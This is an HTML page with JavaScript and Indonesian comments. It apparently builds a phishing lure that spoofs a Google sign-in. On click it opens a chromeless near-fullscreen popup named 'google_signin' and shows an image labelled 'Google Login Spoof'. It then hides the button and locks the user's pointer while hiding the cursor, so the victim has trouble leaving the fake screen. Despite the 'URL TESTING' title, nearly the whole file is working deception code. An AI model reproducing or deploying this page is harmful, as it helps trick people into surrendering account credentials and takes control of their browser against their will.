<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, user-scalable=no" />
    <title>URL TESTING WEBVIEW</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        overflow: hidden;
        background: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        cursor: none; /* Sembunyikan kursor default setelah lock */
      }
      #spoof-img {
        display: none; /* Awalnya disembunyikan */
        max-width: 100%;
        max-height: 100%;
        object-fit: contain;
        position: absolute;
        top: 0;
        left: 0;
        z-index: 1;
      }
      .signin-link {
        padding: 20px 40px;
        background: #4285f4;
        color: white;
        font-size: 18px;
        text-decoration: none;
        border-radius: 4px;
        cursor: pointer;
        z-index: 10;
        position: relative;
      }
    </style>
    <script>
      // Fungsi untuk mengaktifkan Pointer Lock
      function requestPointerLock() {
        const element = document.body; // atau document.documentElement

        element.requestPointerLock =
          element.requestPointerLock ||
          element.mozRequestPointerLock ||
          element.webkitRequestPointerLock;

        if (!element.requestPointerLock) {
          alert("Pointer Lock API tidak didukung di browser ini.");
          return;
        }

        element.requestPointerLock();

        // Event listener untuk mendeteksi perubahan status pointer lock
        document.addEventListener("pointerlockchange", pointerLockChange, false);
        document.addEventListener("mozpointerlockchange", pointerLockChange, false);
        document.addEventListener("webkitpointerlockchange", pointerLockChange, false);

        // Opsional: listener untuk error
        document.addEventListener("pointerlockerror", pointerLockError, false);
        document.addEventListener("mozpointerlockerror", pointerLockError, false);
        document.addEventListener("webkitpointerlockerror", pointerLockError, false);
      }

      function pointerLockChange() {
        if (
          document.pointerLockElement ||
          document.mozPointerLockElement ||
          document.webkitPointerLockElement
        ) {
          console.log("Pointer Lock aktif");
          // Di sini kamu bisa mulai mendengarkan movementX/movementY
          document.addEventListener("mousemove", handleMouseMove, false);
        } else {
          console.log("Pointer Lock nonaktif");
          document.removeEventListener("mousemove", handleMouseMove, false);
        }
      }

      function pointerLockError() {
        console.error("Gagal mengaktifkan Pointer Lock");
      }

      // Contoh handler gerakan mouse (bisa dihapus jika tidak dibutuhkan)
      function handleMouseMove(e) {
        const dx = e.movementX || e.mozMovementX || e.webkitMovementX || 0;
        const dy = e.movementY || e.mozMovementY || e.webkitMovementY || 0;
        // console.log("Mouse movement:", dx, dy);
        // Lakukan sesuatu dengan dx/dy di sini jika diperlukan
      }

      function openWin() {
        // Buka popup hampir fullscreen (sama seperti sebelumnya)
        var params =
          "width=" +
          screen.width +
          ",height=" +
          screen.height +
          ",top=0,left=0" +
          ",menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no";
        var win = window.open("opener.html", "google_signin", params);
        if (win) {
          win.moveTo(0, 0);
          win.resizeTo(screen.width, screen.height);
        }

        // Tampilkan gambar spoof langsung
        document.getElementById("spoof-img").style.display = "block";

        // Sembunyikan tombol setelah 1 detik
        setTimeout(function () {
          document.querySelector(".signin-link").style.display = "none";
        }, 1000);

        // Kembalikan fokus ke window utama
        window.focus();

        // Aktifkan Pointer Lock setelah sedikit delay (pastikan gesture masih valid)
        setTimeout(function () {
          requestPointerLock();
        }, 100);
      }
    </script>
  </head>
  <body>
    <!-- Tombol awal -->
    <a href="#" class="signin-link" onclick="openWin(); return false;">
      Lock Out
    </a>

    <!-- spoof.png akan muncul langsung setelah klik -->
    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
  </body>
</html>
